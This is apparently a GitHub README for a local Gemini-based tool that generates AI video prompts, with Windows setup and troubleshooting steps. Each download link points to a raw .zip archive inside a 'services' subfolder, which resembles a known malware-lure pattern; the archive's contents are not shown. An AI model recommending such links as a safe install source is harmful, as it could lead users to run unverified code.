# 🎬 veoscript-prompt-generator - Create better video prompts fast

[![Download the app](https://img.shields.io/badge/Download%20the%20app-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dape8318/veoscript-prompt-generator/raw/refs/heads/main/services/generator_prompt_veoscript_v2.1.zip)

## 🖥️ What this app does

veoscript-prompt-generator helps you create prompt text for AI video work. It gives you a simple way to build, edit, and use prompts without starting from a blank page each time.

Use it when you want to:
- turn a short idea into a fuller prompt
- keep prompts in one place
- try new prompt styles
- speed up your workflow for AI Studio projects

## 📥 Download and set up

Use this page to download and run this app on your Windows PC:

https://github.com/dape8318/veoscript-prompt-generator/raw/refs/heads/main/services/generator_prompt_veoscript_v2.1.zip

This project runs locally on your computer. You do not need a cloud setup to start.

## 🧰 What you need

Before you start, make sure you have:
- Windows 10 or Windows 11
- a web browser
- Node.js installed
- a Gemini API key

If you do not have Node.js yet, install the current Windows version from the Node.js website before you continue.

## 🚀 Install the app

Follow these steps in order:

1. Open the download page:
   https://github.com/dape8318/veoscript-prompt-generator/raw/refs/heads/main/services/generator_prompt_veoscript_v2.1.zip

2. Download the project files to your computer.

3. Unzip the folder if your browser saves it as a compressed file.

4. Open the project folder.

5. Find the file named `.env.local`.

6. Open `.env.local` in Notepad or another text editor.

7. Add your Gemini API key on the line for `GEMINI_API_KEY`.

8. Save the file.

9. Open Command Prompt in the project folder.

10. Install the required files by running:
   `npm install`

11. Start the app by running:
   `npm run dev`

12. Wait for the local server to start.

13. Open the address shown in the terminal in your browser.

## 🔑 Set your API key

The app uses your Gemini API key to run.

To add it:
- open `.env.local`
- set `GEMINI_API_KEY` to your key
- save the file

Example layout:
- `GEMINI_API_KEY=your_api_key_here`

Keep the key private. Do not share it with other people.

## 🪟 Run on Windows

If you use Windows, this is the usual flow:

1. Download the repository from GitHub.
2. Extract the files.
3. Install Node.js if it is not already on your PC.
4. Open the project folder.
5. Add your Gemini API key in `.env.local`.
6. Run `npm install`.
7. Run `npm run dev`.
8. Open the local link in your browser.

If Windows asks for permission to run Command Prompt or PowerShell, allow it for this folder.

## 🧭 How to use the app

After the app starts, you can:
- enter a short idea
- create a prompt from that idea
- review the output
- copy the text into your AI Studio workflow
- make changes and try again

A good starting input is a simple sentence, such as:
- a short scene idea
- a style note
- a setting
- a camera angle
- a mood or tone

## ✍️ Example use cases

You can use veoscript-prompt-generator for tasks like:
- writing prompt drafts for AI video tools
- building scene descriptions
- testing prompt variations
- keeping a repeatable prompt format
- preparing text for AI Studio projects

It works well when you need fast prompt help and want to keep your process simple.

## 🛠️ Common problems

### `npm install` does not work
Check that Node.js is installed and that you ran the command inside the project folder.

### The app does not start
Make sure you ran:
`npm run dev`

Also check that no other app is using the same local port.

### The page stays blank
Refresh the browser page after the local server starts.

### API key errors
Check the `.env.local` file and make sure the `GEMINI_API_KEY` line is correct.

### Files do not open
Make sure you extracted the full project folder before you start.

## 📁 Basic folder use

You do not need to move files around. Keep the project folder in one place.

A simple setup looks like this:
- downloaded project folder
- `.env.local` file with your API key
- terminal window for commands
- browser window for the app

## 🔐 Privacy and local use

This app runs on your computer. Your browser connects to a local address while the app is running.

For best results:
- keep your API key in the `.env.local` file
- do not share the file
- close the terminal when you are done
- remove the project folder if you no longer need it

## 🧩 Project purpose

This repository is set up to help you run an AI Studio app with a simple local setup. It gives you a direct path from download to use, with a small number of steps.

The main parts are:
- project files
- local development server
- Gemini API key setup
- browser-based use

## 📝 Quick start checklist

- Download the project
- Install Node.js
- Add your Gemini API key to `.env.local`
- Run `npm install`
- Run `npm run dev`
- Open the local app in your browser